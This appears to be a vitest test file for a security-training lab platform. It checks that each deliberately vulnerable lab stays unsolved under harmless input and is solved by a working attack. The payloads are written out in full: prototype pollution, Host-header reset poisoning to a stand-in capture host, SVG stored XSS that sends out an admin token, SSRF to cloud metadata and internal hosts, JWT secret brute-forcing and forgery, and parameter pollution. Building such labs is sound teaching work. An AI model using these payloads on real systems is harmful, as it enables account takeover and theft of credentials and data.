import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { CookieClient } from "./helpers.js";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, jsonPost, launch } from "./lab-harness.js";
import { sign, hmacSha256Base64Url, decode } from "../../packages/lab-sdk/src/index.js";
import { rawRequest } from "./proxy.js";

/**
 * Node's fetch() forbids setting the Host header (per the Fetch spec, same
 * as a real browser) — it's silently overridden with the real connection
 * host. A genuine forged-Host request needs the lower-level http module,
 * which builds the raw request itself (closer to what Burp Repeater does).
 * `rawRequest` does exactly that, and routes through the proxy harness when
 * NULLLAB_TEST_PROXY=1 so a forged Host survives proxy form too.
 */
async function requestWithHost(port: number, path: string, forgedHost: string, body: string): Promise<{ status: number }> {
  const res = await rawRequest({
    port,
    path,
    method: "POST",
    headers: { Host: forgedHost, "content-type": "application/x-www-form-urlencoded" },
    body,
  });
  return { status: res.status };
}

const form = (c: CookieClient, path: string, fields: Record<string, string>) =>
  c.fetch(path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString() });
const text = async (r: Response) => await r.text();

describe("modern bug-bounty batch 10", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4210, labPortStart: 7900, labPortEnd: 7960 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("mp-prototype-pollution-admin: a harmless settings payload never solves it; a __proto__ payload pollutes Object.prototype", async () => {
    const learner = await (await import("./lab-harness.js")).newLearner(t);
    const lab = await launch(t, "mp-prototype-pollution-admin", learner);
    const xp0 = await lab.xp();

    // This is purely client-side JS, so even the "harmless" baseline needs a
    // real browser (the admin-bot) — a plain HTTP fetch only ever sees the
    // unexecuted page source, never the result of running its script.
    const harmlessVisit = await learner.json<{ ok: boolean }>(`/api/instances/${lab.id}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "/?settings=" + encodeURIComponent(JSON.stringify({ theme: "dark" })) }),
    });
    expect(harmlessVisit.body.ok).toBe(true);
    expect(await lab.solved()).toBe(false);

    const sim = await learner.json<{ ok: boolean }>(`/api/instances/${lab.id}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "/?settings=" + encodeURIComponent(JSON.stringify({ ["__proto__"]: { isAdmin: true } })) }),
    });
    expect(sim.body.ok).toBe(true);
    await expectSolvedOnce(
      lab,
      "hard",
      () =>
        learner.json(`/api/instances/${lab.id}/simulate-admin-visit`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ path: "/?settings=" + encodeURIComponent(JSON.stringify({ ["__proto__"]: { isAdmin: true } })) }),
        }),
      xp0,
    );
    await lab.stop();
  }, 30_000);

  it("mc-host-header-reset-poisoning: a default-host request never solves it; a forged Host header poisons the emailed link", async () => {
    const lab = await launch(t, "mc-host-header-reset-poisoning");
    const b = lab.browser();
    const xp0 = await lab.xp();

    await form(b, "/forgot-password", { username: "alice" });
    let outbox = await text(await b.fetch("/mail/outbox"));
    expect(outbox).toContain(`127.0.0.1:${lab.port}`);
    expect(await lab.solved()).toBe(false);

    await requestWithHost(lab.port, "/forgot-password", "evil-mail-capture.test", "username=alice");
    outbox = await text(await b.fetch("/mail/outbox"));
    expect(outbox).toContain("evil-mail-capture.test");
    await expectSolvedOnce(lab, "hard", () => requestWithHost(lab.port, "/forgot-password", "evil-mail-capture.test", "username=alice"), xp0);
    await lab.stop();
  });

  it("xp-svg-upload-stored-xss: a harmless SVG never solves it; a script-carrying SVG exfiltrates the admin token via the real admin-bot", async () => {
    const learner = await (await import("./lab-harness.js")).newLearner(t);
    const lab = await launch(t, "xp-svg-upload-stored-xss", learner);
    const b = lab.browser();
    const xp0 = await lab.xp();

    await form(b, "/gallery/upload", { filename: "circle.svg", svg: "<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><circle cx='50' cy='50' r='40'/></svg>" });
    const sim1 = await learner.json<{ ok: boolean }>(`/api/instances/${lab.id}/simulate-admin-visit`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ path: "/gallery" }) });
    expect(sim1.body.ok).toBe(true);
    expect(await lab.solved()).toBe(false);

    const payload = `<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('/collect?token='+document.getElementById('gallery-root').dataset.token)</script></svg>`;
    await form(b, "/gallery/upload", { filename: "evil.svg", svg: payload });
    const sim2 = await learner.json<{ ok: boolean }>(`/api/instances/${lab.id}/simulate-admin-visit`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ path: "/gallery" }) });
    expect(sim2.body.ok).toBe(true);
    expect(await lab.solved()).toBe(true);
    const xpNow = await lab.xp();
    expect(xpNow).toBeGreaterThan(xp0);
    await lab.stop();
  }, 30_000);

  it("ssrf-cloud-metadata-widget: a normal status URL never solves it; the metadata address does", async () => {
    const lab = await launch(t, "ssrf-cloud-metadata-widget");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await b.fetch("/dashboard"));
    expect(normal).toContain("operational");
    expect(await lab.solved()).toBe(false);

    await form(b, "/widget/configure", { url: "http://169.254.169.254/" });
    const leak = await text(await b.fetch("/dashboard"));
    expect(leak).toContain("accessKeyId");
    await expectSolvedOnce(lab, "medium", () => b.fetch("/dashboard"), xp0);
    await lab.stop();
  });

  it("auth-jwt-weak-secret: alg:none is correctly rejected here (real sig check); brute-forcing the wordlist and forging a token works", async () => {
    const lab = await launch(t, "auth-jwt-weak-secret");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const loginRes = await jsonPost(b, "/api/login", { username: "alice", password: "practice123" });
    const token = (loginRes.body as { token: string }).token;
    const forgedNone = `${token.split(".")[0]!.replace(/./, (c) => c)}`; // not used; build alg:none explicitly below
    void forgedNone;
    const b64url = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
    const noneToken = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({ sub: "attacker", role: "admin" })}.`;
    expect((await b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${noneToken}` } })).status).toBe(401); // alg:none correctly rejected
    expect(await lab.solved()).toBe(false);

    const WORDLIST = ["dragon", "sunshine", "letmein", "football", "monkey123", "iloveyou", "starfish", "qwerty99"];
    const parts = decode(token)!;
    let foundSecret: string | null = null;
    for (const candidate of WORDLIST) {
      if (hmacSha256Base64Url(parts.signingInput, candidate) === parts.signature) {
        foundSecret = candidate;
        break;
      }
    }
    expect(foundSecret).not.toBeNull();

    const forged = sign({ sub: "attacker", role: "admin" }, foundSecret!);
    const win = await b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${forged}` } });
    expect(win.status).toBe(200);
    await expectSolvedOnce(lab, "hard", () => b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${sign({ sub: "attacker2", role: "admin" }, foundSecret!)}` } }), xp0);
    await lab.stop();
  });

  it("ssrf-pdf-report-resource-fetch: a normal logo image never solves it; an internal img src does, via the rendering step", async () => {
    const lab = await launch(t, "ssrf-pdf-report-resource-fetch");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await form(b, "/invoices/render-pdf", { html: `<img src="https://cdn.invoiceassets.test/logo.png" />` }));
    expect(normal).toContain("fake-logo-image-bytes");
    expect(await lab.solved()).toBe(false);

    const leak = await text(await form(b, "/invoices/render-pdf", { html: `<p>Total due</p><img src="http://internal-billing.lab/" />` }));
    expect(leak).toContain("stripeLikeKey");
    await expectSolvedOnce(lab, "hard", () => form(lab.browser(), "/invoices/render-pdf", { html: `<img src="http://internal-billing.lab/" />` }), xp0);
    await lab.stop();
  });

  it("ac-bulk-export-no-scope: the scoped directory API never solves it; the CSV export leaks another org's rows", async () => {
    const lab = await launch(t, "ac-bulk-export-no-scope");
    const xp0 = await lab.xp();
    const b = lab.browser();
    await formLogin(b, "alice", "practice123");

    const scoped = await b.json<{ employees: { org: string }[] }>("/api/directory");
    expect(scoped.body.employees.every((e) => e.org === "Acme")).toBe(true);
    expect(await lab.solved()).toBe(false);

    const csv = await text(await b.fetch("/api/export/employees.csv"));
    expect(csv).toContain("Globex");
    expect(csv).toContain("Marta Lund");
    await expectSolvedOnce(lab, "medium", () => b.fetch("/api/export/employees.csv"), xp0);
    await lab.stop();
  });

  it("mc-http-parameter-pollution: a single own userId never solves it; a repeated param with the owner first and victim last does", async () => {
    const lab = await launch(t, "mc-http-parameter-pollution");
    const xp0 = await lab.xp();
    const b = lab.browser();
    await formLogin(b, "alice", "practice123");

    const own = await b.json<{ balanceUsd: number }>("/api/account?userId=alice");
    expect(own.status).toBe(200);
    expect(own.body.balanceUsd).toBe(4820);
    expect((await b.fetch("/api/account?userId=bob")).status).toBe(403); // directly requesting bob's id fails cleanly
    expect(await lab.solved()).toBe(false);

    const leak = await b.json<{ balanceUsd: number }>("/api/account?userId=alice&userId=bob");
    expect(leak.status).toBe(200);
    expect(leak.body.balanceUsd).toBe(1190);
    await expectSolvedOnce(lab, "hard", () => b.fetch("/api/account?userId=alice&userId=bob"), xp0);
    await lab.stop();
  });
});
